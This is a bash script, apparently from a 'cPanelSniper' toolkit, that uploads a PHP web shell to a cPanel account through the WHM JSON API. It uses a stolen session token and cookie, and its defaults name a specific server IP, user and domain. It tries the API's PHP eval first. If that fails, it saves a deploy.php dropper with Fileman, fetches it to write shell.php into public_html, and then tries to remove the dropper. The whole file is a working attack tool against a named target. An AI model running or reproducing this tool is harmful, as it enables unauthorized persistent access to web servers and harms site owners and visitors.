#!/bin/bash
# Upload shell using PHP command execution via WHM
# Usage: ./upload_via_php_exec.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE> <TARGET_USER> <TARGET_DOMAIN>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
TARGET_USER="${4:-wagamacy}"
TARGET_DOMAIN="${5:-wagamama.com.cy}"

echo "========================================"
echo "  Upload via PHP exec() command"
echo "========================================"
echo ""
echo "Target: $TARGET_DOMAIN ($TARGET_USER)"
echo ""

# Check shell file
SHELL_FILE="/root/cPanelSniper/shell.php"
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Convert to base64
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")
echo "✓ Shell loaded: $(echo "$SHELL_B64" | wc -c) bytes (base64)"
echo ""

# Create PHP code to write the shell
PHP_CODE="<?php
\$content = base64_decode('${SHELL_B64}');
\$file = '/home/${TARGET_USER}/public_html/shell.php';
if (file_put_contents(\$file, \$content)) {
    chmod(\$file, 0644);
    chown(\$file, '${TARGET_USER}:${TARGET_USER}');
    echo 'SUCCESS';
} else {
    echo 'FAILED: ' . error_get_last()['message'];
}
?>"

# Encode PHP code
PHP_B64=$(echo -n "$PHP_CODE" | base64 -w 0)

echo "[1/3] Trying to execute PHP code..."

# Try using WHM API to run PHP command
# Method 1: Use PHP::eval via cPanel API
RESULT=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "cpanel_jsonapi_user=${TARGET_USER}" \
  -d "cpanel_jsonapi_module=PHP" \
  -d "cpanel_jsonapi_func=eval" \
  -d "cpanel_jsonapi_apiversion=3" \
  -d "code=${PHP_B64}" \
  -d "encoding=base64" 2>/dev/null)

echo "Result:"
echo "$RESULT" | python3 -m json.tool 2>/dev/null || echo "$RESULT"
echo ""

if echo "$RESULT" | grep -q "SUCCESS"; then
    echo "✅ Shell uploaded successfully!"

    # Test if file exists
    echo ""
    echo "[2/3] Verifying file..."
    HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET_DOMAIN}/shell.php")
    if [ "$HTTP_CODE" = "200" ]; then
        echo "✅ Shell accessible: https://${TARGET_DOMAIN}/shell.php"
    else
        echo "⚠️  Shell returned HTTP $HTTP_CODE"
    fi
else
    echo "❌ PHP exec failed, trying alternative method..."
    echo ""

    # Method 2: Try creating a PHP file that we'll execute
    echo "[2/3] Creating deploy PHP file..."

    DEPLOY_PHP="<?php
\$content = base64_decode('${SHELL_B64}');
\$file = '/home/${TARGET_USER}/public_html/shell.php';
file_put_contents(\$file, \$content);
chmod(\$file, 0644);
chown(\$file, '${TARGET_USER}:${TARGET_USER}');
echo 'DONE';
?>"

    DEPLOY_B64=$(echo -n "$DEPLOY_PHP" | base64 -w 0)

    # Create deploy.php using Fileman (if available)
    RESULT2=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/cpanel" \
      -H "Cookie: whostmgrsession=${COOKIE}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "cpanel_jsonapi_user=${TARGET_USER}" \
      -d "cpanel_jsonapi_module=Fileman" \
      -d "cpanel_jsonapi_func=save_file_content" \
      -d "cpanel_jsonapi_apiversion=3" \
      -d "dir=%2Fpublic_html" \
      -d "file=deploy.php" \
      -d "content=${DEPLOY_B64}" \
      -d "encoding=base64" 2>/dev/null)

    echo "Deploy file result:"
    echo "$RESULT2" | python3 -m json.tool 2>/dev/null || echo "$RESULT2"
    echo ""

    # Access deploy.php to trigger deployment
    echo "[3/3] Executing deploy.php..."
    curl -sk "https://${TARGET_DOMAIN}/deploy.php" 2>/dev/null

    # Remove deploy.php
    echo "Cleaning up deploy.php..."
    curl -sk "https://${TARGET_DOMAIN}/deploy.php?clean=1" 2>/dev/null

    echo ""
    echo "Test shell: https://${TARGET_DOMAIN}/shell.php"
fi

echo ""
echo "========================================"
